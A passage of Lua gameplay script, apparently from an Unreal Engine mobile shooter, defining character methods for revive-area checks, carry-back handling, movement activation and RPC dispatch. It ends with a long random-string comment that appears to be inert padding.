  local uForVec2D = uPawnFor:GetSafeNormal2D(1.0E-6)
  local EndPath = uPawnLoc + uForVec2D * 200
  local uHitResult = import("/Script/Engine.HitResult")()
  local EDrawDebugTrace = import("EDrawDebugTrace")
  local ActorClass = import("/Script/Engine.Actor")
  local ActorsToIgnore = slua.Array(UEnums.EPropertyClass.Object, ActorClass)
  local bHit, uHitResult = UKismetSystemLibrary.LineTraceSingle(self.Object, uPawnLoc, EndPath, 6, true, ActorsToIgnore, EDrawDebugTrace.None, uHitResult, true, FLinearColor.Red, FLinearColor.Green, 1)
  if bHit then
    print(bWriteLog and "CharacterBase:CheckParachuteLandShouldUseSkill not Blocak pos")
    return false
  end
  return true
end

function CharacterBase:IsOverlappingWithArea(TargetActor)
  local Result = false
  local AreaActor
  local DSReviveSubsystem = SubsystemMgr:Get("DSReviveSubsystem")
  local POIGeneralAreaClass = slua.loadClass("/Game/Mod/EvoBase/BluePrints/Actor/BaseLevelEnterArea.BaseLevelEnterArea")
  local uAreaList = self:GetOverlappingActors(slua.Array(UEnums.EPropertyClass.Object, import("/Script/Engine.Actor")), POIGeneralAreaClass)
  for _, uArea in pairs(uAreaList) do
    if slua.isValid(uArea) and (TargetActor == nil or TargetActor == uArea) and DSReviveSubsystem.POIAreaRegisteredInfo[uArea] and uArea.CheckPlayerCanSelfRevive then
      local bAreaResult = uArea:CheckPlayerCanSelfRevive(self.Object)
      if bAreaResult then
        Result = true
        AreaActor = uArea
        break
      end
    end
  end
  print(bWriteLog and "CharacterBase:IsOverlappingWithArea, PlayerKey = " .. tostring(self.PlayerKey) .. ", Result = " .. tostring(Result) .. ", AreaActor = " .. tostring(AreaActor) .. ", TargetActor = " .. tostring(TargetActor))
  return Result, AreaActor
end

function CharacterBase:IsOverlappingIgnoringArea(TargetActor)
  local Result = false
  local AreaActor
  local DSReviveSubsystem = SubsystemMgr:Get("DSReviveSubsystem")
  local POIGeneralAreaClass = slua.loadClass("/Game/Mod/EvoBase/BluePrints/Actor/BaseLevelEnterArea.BaseLevelEnterArea")
  local uAreaList = self:GetOverlappingActors(slua.Array(UEnums.EPropertyClass.Object, import("/Script/Engine.Actor")), POIGeneralAreaClass)
  for _, uArea in pairs(uAreaList) do
    if slua.isValid(uArea) and TargetActor ~= uArea and DSReviveSubsystem.POIAreaRegisteredInfo[uArea] and uArea.CheckPlayerCanSelfRevive then
      local bAreaResult = uArea:CheckPlayerCanSelfRevive(self.Object)
      if bAreaResult then
        Result = true
        AreaActor = uArea
        break
      end
    end
  end
  print(bWriteLog and "CharacterBase:IsOverlappingIgnoringArea, PlayerKey = " .. tostring(self.PlayerKey) .. ", Result = " .. tostring(Result) .. ", AreaActor = " .. tostring(AreaActor) .. ", TargetActor = " .. tostring(TargetActor))
  return Result, AreaActor
end

function CharacterBase:UpdatePOIReviveAreaID(uExcludeArea)
  local uAreaList = self:GetOverlappingActors(slua.Array(UEnums.EPropertyClass.Object, import("/Script/Engine.Actor")), import("/Script/Engine.Actor"))
  for _, uArea in pairs(uAreaList) do
    if slua.isValid(uArea) and uArea ~= uExcludeArea and uArea.HandleSetReviveState ~= nil and uArea:HandleSetReviveState(uArea, true) then
      return true
    end
  end
  return false
end

function CharacterBase:OnServerSpectatorKickFromGame()
  local CarryBackComp = self:GetCarryBackComp()
  local KickPlayerName = self:GetPlayerNameSafety()
  local hasBeCarryBack = self:HasState(EPawnState.BeCarriedBack)
  local hasCarryBack = self:HasState(EPawnState.Carryback)
  print(bWriteLog and "==>CharacterCarryBackComponent:OnServerSpectatorKickFromGame KickPlayerName:" .. tostring(KickPlayerName) .. ",Role:" .. tostring(self.Role) .. ",hasBeCarryBack:" .. tostring(hasBeCarryBack))
  if slua.isValid(CarryBackComp) then
    if hasBeCarryBack then
      local CarryBackCharOfKickPlayer = CarryBackComp.CarryBackCharacter
      if slua.isValid(CarryBackCharOfKickPlayer) then
        local CarryBackCharOfKickPlayerName = CarryBackCharOfKickPlayer:GetPlayerNameSafety()
        print(bWriteLog and "CharacterCarryBackComponent:OnServerSpectatorKickFromGame do break Carryback CarryBackCharOfKickPlayerName:" .. tostring(CarryBackCharOfKickPlayerName) .. ",Role:" .. tostring(CarryBackCharOfKickPlayer.Role))
        local CarryBackCharOfKickPlayerComp = CarryBackCharOfKickPlayer:GetCarryBackComp()
        if slua.isValid(CarryBackCharOfKickPlayerComp) then
          CarryBackCharOfKickPlayerComp:RPC_ServerManualBreakCarryBackState()
        end
      end
    end
    if hasCarryBack then
      local CarryBackName = self:GetPlayerNameSafety()
      print(bWriteLog and "CharacterCarryBackComponent:OnServerSpectatorKickFromGame do break Carryback CarryBackName:" .. tostring(CarryBackName) .. ",Role:" .. tostring(self.Role))
      CarryBackComp:RPC_ServerManualBreakCarryBackState()
    end
  end
end

function CharacterBase:GetPhysicsType()
  local nPhysicsType = 0
  local USTExtraGameInstance = import("STExtraGameInstance")
  local uGameInstance = USTExtraGameInstance.GetInstance()
  if slua.isValid(uGameInstance) then
    local ModType = uGameInstance.ModType
    local ModType2 = uGameInstance.ModType2
    if ModType == "Escape" or ModType2 == "Escape" then
      if self.HeroPropFeature then
        local nHeroID = self.HeroPropFeature:GetCurrentHeroID()
        if nHeroID ~= nil then
          nPhysicsType = 2
        end
      end
    elseif (ModType == "Halloween4" or ModType2 == "Halloween4") and self.HeroPropFeature then
      local nHeroID = self.HeroPropFeature:GetCurrentHeroID()
      if nHeroID ~= nil then
        nPhysicsType = 1
      end
    end
    print(bWriteLog and string.format("CharacterBase:GetPhysicsType ModType[%s] ModType2[%s] nPhysicsType[%s]", ModType, ModType2, nPhysicsType))
  end
  return nPhysicsType
end

function CharacterBase:ActivateCharacterMovement()
  if not slua.isValid(self.CharacterMovement) then
    return
  end
  local ENetRole = import("ENetRole")
  self:SetReplicateMovement(true)
  if Client then
    self.bReplicateMovement = true
  end
  self.CharacterMovement:SetMovementMode(EMovementMode.MOVE_Walking, 0)
  self.CharacterMovement:Activate(false)
  self.CharacterMovement:SetComponentTickEnabled(true)
  if self.Role == ENetRole.ROLE_SimulatedProxy then
    local UGameplayStatics = import("GameplayStatics")
    self.CharacterMovement:SetClientReceiveServerStateTimestamp(UGameplayStatics.GetTimeSeconds(CGameWorld))
  elseif self.Role == ENetRole.ROLE_Authority then
    self.CharacterMovement:ForceNetUpdate()
  end
  self.CharacterMovement.bForbidActiveWhenAttachParent = true
end

function CharacterBase:DeactivateCharacterMovement(bForce)
  if not slua.isValid(self.CharacterMovement) then
    return
  end
  if bForce then
    self.CharacterMovement.bForbidActiveWhenAttachParent = false
  end
  self:SetReplicateMovement(false)
  if not Client then
    self.CharacterMovement:SetMovementMode(EMovementMode.MOVE_None, 0)
  end
  self.CharacterMovement:Deactivate()
  self.CharacterMovement:SetComponentTickEnabled(false)
  if Client then
    local uController = slua_GameFrontendHUD:GetPlayerController()
    if slua.isValid(uController) and uController:IsSpectator() then
      self.CharacterMovement:ResetSimulateMoveCaches(false)
    end
  end
end

function CharacterBase:MultiCast_GenericRPC(ID, Bytes)
  local GenericRPCEnums = require("GameLua.Mod.BaseMod.GamePlay.GenericRPC.GenericRPCEnums")
  local GenericRPCUtil = require("GameLua.Mod.BaseMod.GamePlay.GenericRPC.GenericRPCUtil")
  GenericRPCUtil._OnRecv(self, ID, GenericRPCEnums.EGenericRPCDirection.Multicast, Bytes)
end

local class = require("class")
local CActorBase = require("GameLua.Mod.BaseMod.Common.Core.ActorBase")
local CCharacterBase = class(CActorBase, nil, CharacterBase)
return require("combine_class").DeclareFeature(CCharacterBase, {
  {
    InteractWithVehicleFeature = "GameLua.GameCore.Feature.InteractWithVehicleFeature"
  },
  {
    PetFormCharFeature = "GameLua.Activity.Commercialize.GamePlay.Pet.PetFormCharFeature"
  },
  {
    CoopEmoteCharFeature = "GameLua.Activity.Commercialize.GamePlay.CoopEmote.CoopEmoteCharFeature"
  },
  {
    WeaponKillCounterFeature = "GameLua.Activity.Commercialize.GamePlay.WeaponKillCounter.WeaponKillCounterFeature"
  },
  {
    PetExhibitFeature = "GameLua.Activity.Commercialize.GamePlay.Pet.PetExhibitFeature"
  }
}, "CharacterBase")

--ZNPAD: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